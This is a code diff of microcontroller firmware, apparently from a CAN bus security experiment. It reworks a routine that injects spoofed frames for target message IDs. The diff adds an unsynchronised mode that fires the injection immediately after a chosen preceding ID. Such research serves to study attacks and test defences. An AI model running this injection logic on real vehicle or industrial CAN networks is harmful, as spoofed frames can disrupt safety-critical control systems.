@@ -128,6 +128,8 @@ volatile uint8_t g_skip_attack = SKIP_ATTACK;
 #define RXOBJECT_RESERVED1  15
 #define RXOBJECT            16
 
+void do_attack_injection(void);
+
 
 // The error routine that is called if the driver library encounters an error.
 #ifdef DEBUG
@@ -161,9 +163,34 @@ void delay_ticks(uint32_t ticks)
     delay_us(ticks/TICKS_PER_US);
 }
 
-static inline void got_CAN_msg_interrupt(void)
+static inline void got_CAN_msg_interrupt(uint32_t ID)
 {
     uint32_t timer_val;
+
+    if (g_ui32ExpCtrl & (SYNC_PERIOD | SYNC_0PHASE)) {
+        g_ui32LastCANIntTimer = TimerValueGet(TIMER3_BASE, TIMER_A);
+    } else {
+        if (g_ui32ExpCtrl & ATTACK_MASK && g_reset == false) {
+            // no sync, attack --> preceded message injection
+            if ((PRECEDED_ID == ID && g_target_id == TARGET_ID) || (PRECEDED_ID_2 == ID && g_target_id == TARGET_ID_2)) {
+                do_attack_injection();
+            }
+        }
+    }
+
+    switch(ID) {
+        case RXOBJECT: g_bRXFlag = true; break;
+#if defined(SEND_RESET)
+        case TXOBJECT_RESET: g_bRESETFlag = true; break;
+#endif
+        case TXOBJECT_5: g_bTXFlag_5 = true; break;
+        case TXOBJECT_Target_1: g_bTXTarget_1 = true; break;
+        case TXOBJECT_Target_2: g_bTXTarget_2 = true; break;
+        case TXOBJECT_10: g_bTXFlag_10 = true; break;
+        case TXOBJECT_100: g_bTXFlag_100 = true; break;
+        case TXOBJECT_1000: g_bTXFlag_1000 = true; break;
+        default: g_bTXFlag = ID; break;
+    }
 
     // This intends to count the number of messages since the last bus idle time.
     // TODO: It is a crude hack that may need tuning by changing the LATENCY definition.
@@ -195,8 +222,6 @@ void CAN0IntHandler(void)
 
     IntMasterDisable();
 
-    g_ui32LastCANIntTimer = TimerValueGet(TIMER3_BASE, TIMER_A);
-
     while ((ui32Status = CANIntStatus(CAN0_BASE, CAN_INT_STS_CAUSE)) != 0) {
 
         if(ui32Status == CAN_INT_INTID_STATUS) {
@@ -219,45 +244,27 @@ void CAN0IntHandler(void)
             // Errors are handled in CANErrorHandler().
             g_ui32ErrFlag |= ui32Status;
         } else {
-            switch(ui32Status) {
-                case RXOBJECT: g_bRXFlag = true; break;
-#if defined(SEND_RESET)
-                case TXOBJECT_RESET: g_bRESETFlag = true; break;
-#endif
-                case TXOBJECT_5: g_bTXFlag_5 = true; break;
-                case TXOBJECT_Target_1: g_bTXTarget_1 = true; break;
-                case TXOBJECT_Target_2: g_bTXTarget_2 = true; break;
-                case TXOBJECT_10: g_bTXFlag_10 = true; break;
-                case TXOBJECT_100: g_bTXFlag_100 = true; break;
-                case TXOBJECT_1000: g_bTXFlag_1000 = true; break;
-                default: g_bTXFlag = ui32Status; break;
-            }
-            got_CAN_msg_interrupt();
+            got_CAN_msg_interrupt(ui32Status);
             CANIntClear(CAN0_BASE, ui32Status);
         }
     }
     IntMasterEnable();
 }
 
-void do_attack_injection(uint32_t count)
+void do_attack_injection()
 {
     static uint16_t skip_cnt = 0;
-    if (g_ui32ExpCtrl & ATTACK_MASK) {
-        if ( g_sync == SYNC_MODE_SYNCHED && g_reset == false ) {
-            if ( skip_cnt % g_skip_attack == 0 ) {
-                if ( g_target_id == TARGET_ID ) {
-                    CANMessageSet(CAN0_BASE, TXOBJECT_Target_1, &g_sCAN0TxMessage_Target_1, MSG_OBJ_TYPE_TX);
-                } else {
-                    if (g_ui32ExpCtrl & ATTACK_TRANSITIVE) {
-                        CANMessageSet(CAN0_BASE, TXOBJECT_Target_2, &g_sCAN0TxMessage_Target_2, MSG_OBJ_TYPE_TX);
-                    }
-                }
-            }
-            ++skip_cnt;
+
+    if ( skip_cnt % g_skip_attack == 0 ) {
+        if ( g_target_id == TARGET_ID ) {
+            CANMessageSet(CAN0_BASE, TXOBJECT_Target_1, &g_sCAN0TxMessage_Target_1, MSG_OBJ_TYPE_TX);
         } else {
-            skip_cnt = 0;
+            if (g_ui32ExpCtrl & ATTACK_TRANSITIVE) {
+                CANMessageSet(CAN0_BASE, TXOBJECT_Target_2, &g_sCAN0TxMessage_Target_2, MSG_OBJ_TYPE_TX);
+            }
         }
     }
+    ++skip_cnt;
 }
 
 void send_messages(uint32_t count)
@@ -267,12 +274,16 @@ void send_messages(uint32_t count)
             if (g_sCAN0TxMessage_5) {
                 CANMessageSet(CAN0_BASE, TXOBJECT_5, g_sCAN0TxMessage_5, MSG_OBJ_TYPE_TX);
             }
-            if (g_ui32ExpCtrl & (SYNC_PERIOD | SYNC_0PHASE)) {
-                do_attack_injection(count);
+            if (g_ui32ExpCtrl & ATTACK_MASK) {
+                if (g_ui32ExpCtrl & (SYNC_PERIOD | SYNC_0PHASE) && g_sync == SYNC_MODE_SYNCHED) {
+                    do_attack_injection();
+                }
             }
         } else {
-            if (g_ui32ExpCtrl & (SYNC_PERIOD | SYNC_0PHASE)) {
-                do_attack_injection(count);
+            if (g_ui32ExpCtrl & ATTACK_MASK) {
+                if (g_ui32ExpCtrl & (SYNC_PERIOD | SYNC_0PHASE) && g_sync == SYNC_MODE_SYNCHED) {
+                    do_attack_injection();
+                }
             }
             if (g_sCAN0TxMessage_5) {
                 CANMessageSet(CAN0_BASE, TXOBJECT_5, g_sCAN0TxMessage_5, MSG_OBJ_TYPE_TX);
@@ -645,6 +656,15 @@ got_rx_message(int ID, int count)
 {
     int rv = count;
     uint32_t rec, tec;
+
+    if (g_ui32ExpCtrl & ATTACK_MASK && g_reset == false) {
+        if (!(g_ui32ExpCtrl & SYNC_MASK)) {
+            // no sync, attack --> preceded message injection
+            if ((PRECEDED_ID == ID && g_target_id == TARGET_ID) || (PRECEDED_ID_2 == ID && g_target_id == TARGET_ID_2)) {
+                do_attack_injection();
+            }
+        }
+    }
 
     if (g_ui32ExpCtrl & DISABLE_RETRANS_RXPM) {
         uint32_t now = TimerValueGet(TIMER3_BASE, TIMER_A);
